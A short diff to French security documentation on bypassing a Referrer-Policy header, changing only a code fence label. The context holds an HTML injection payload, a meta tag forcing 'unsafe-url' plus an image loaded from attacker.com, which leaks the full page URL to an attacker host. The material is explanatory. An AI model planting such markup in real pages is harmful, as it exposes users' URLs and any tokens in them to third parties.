@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Contre-mesures
 
 Vous pouvez contourner cette règle en utilisant une balise meta HTML (l'attaquant doit exploiter une injection HTML) :
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
